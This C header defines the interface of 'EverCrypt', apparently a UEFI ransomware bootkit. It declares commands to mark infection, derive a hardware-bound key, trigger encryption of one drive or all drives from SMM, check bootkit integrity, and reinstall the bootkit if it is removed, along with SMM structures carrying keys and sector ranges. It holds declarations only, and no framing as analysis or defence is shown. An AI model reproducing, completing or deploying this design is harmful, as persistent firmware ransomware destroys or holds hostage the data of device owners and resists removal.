/** @file
  EverCrypt Protocol Definitions
  Communication between ME ↔ DXE ↔ SMM

  Copyright (c) 2025, EverCrypt Project. All rights reserved.
  SPDX-License-Identifier: BSD-2-Clause-Patent
**/

#ifndef __EVERCRYPT_PROTO_H__
#define __EVERCRYPT_PROTO_H__

#include <Uefi.h>

//
// Protocol GUID
//
#define EVERCRYPT_PROTOCOL_GUID \
  { 0xDEADC0DE, 0x2025, 0x4E56, \
    { 0x52, 0x43, 0x52, 0x59, 0x50, 0x54, 0x4D, 0x45 } }

//
// Protocol Version
//
#define EVERCRYPT_PROTOCOL_VERSION  0x00010000

//
// Communication Commands
//
#define EVERCRYPT_CMD_MARK_INFECTION    0x01
#define EVERCRYPT_CMD_DERIVE_KEY        0x02
#define EVERCRYPT_CMD_ENCRYPT_TRIGGER   0x03
#define EVERCRYPT_CMD_CHECK_INTEGRITY   0x04
#define EVERCRYPT_CMD_REINSTALL         0x05

//
// Status Codes
//
#define EVERCRYPT_STATUS_ACTIVE         0xEC
#define EVERCRYPT_STATUS_DORMANT        0xED
#define EVERCRYPT_STATUS_COMPROMISED    0xEE

//
// Encryption Configuration
//
#define EVERCRYPT_KEY_SIZE              32  // 256-bit
#define EVERCRYPT_NONCE_SIZE            12  // ChaCha20 nonce
#define EVERCRYPT_TAG_SIZE              16  // Poly1305 tag

//
// Forward declarations
//
typedef struct _EVERCRYPT_PROTOCOL EVERCRYPT_PROTOCOL;

/**
  Derive hardware-bound encryption key

  @param[in]  This                 Protocol instance
  @param[out] Key                  Output buffer (32 bytes)
  
  @retval EFI_SUCCESS              Key derived successfully
  @retval EFI_DEVICE_ERROR         Hardware fuse read failed
**/
typedef
EFI_STATUS
(EFIAPI *EVERCRYPT_DERIVE_KEY)(
  IN  EVERCRYPT_PROTOCOL  *This,
  OUT UINT8               *Key
  );

/**
  Trigger encryption from SMM

  @param[in]  This                 Protocol instance
  @param[in]  TargetDrive          Drive to encrypt (0 = all)
  
  @retval EFI_SUCCESS              Encryption started
  @retval EFI_ACCESS_DENIED        Not in SMM context
**/
typedef
EFI_STATUS
(EFIAPI *EVERCRYPT_TRIGGER_ENCRYPTION)(
  IN EVERCRYPT_PROTOCOL  *This,
  IN UINT8               TargetDrive
  );

/**
  Check bootkit integrity

  @param[in]  This                 Protocol instance
  @param[out] Status               Current status code
  
  @retval EFI_SUCCESS              Integrity verified
  @retval EFI_SECURITY_VIOLATION   Tampering detected
**/
typedef
EFI_STATUS
(EFIAPI *EVERCRYPT_CHECK_INTEGRITY)(
  IN  EVERCRYPT_PROTOCOL  *This,
  OUT UINT8               *Status
  );

/**
  Reinstall bootkit if removed

  @param[in]  This                 Protocol instance
  
  @retval EFI_SUCCESS              Reinstallation complete
**/
typedef
EFI_STATUS
(EFIAPI *EVERCRYPT_REINSTALL)(
  IN EVERCRYPT_PROTOCOL  *This
  );

//
// Protocol Structure
//
struct _EVERCRYPT_PROTOCOL {
  UINT32                            Version;
  EVERCRYPT_DERIVE_KEY              DeriveKey;
  EVERCRYPT_TRIGGER_ENCRYPTION      TriggerEncryption;
  EVERCRYPT_CHECK_INTEGRITY         CheckIntegrity;
  EVERCRYPT_REINSTALL               Reinstall;
};

extern EFI_GUID gEverCryptProtocolGuid;

//
// SMM Communication Structures
//

#pragma pack(1)

typedef struct {
  UINT8   Command;
  UINT8   Reserved[3];
  UINT32  DataSize;
} EVERCRYPT_SMM_COMM_HEADER;

typedef struct {
  EVERCRYPT_SMM_COMM_HEADER Header;
  UINT8                     Key[EVERCRYPT_KEY_SIZE];
} EVERCRYPT_SMM_KEY_DATA;

typedef struct {
  EVERCRYPT_SMM_COMM_HEADER Header;
  UINT64                    StartLBA;
  UINT64                    EndLBA;
  UINT8                     DriveIndex;
} EVERCRYPT_SMM_ENCRYPT_DATA;

#pragma pack()

#endif // __EVERCRYPT_PROTO_H__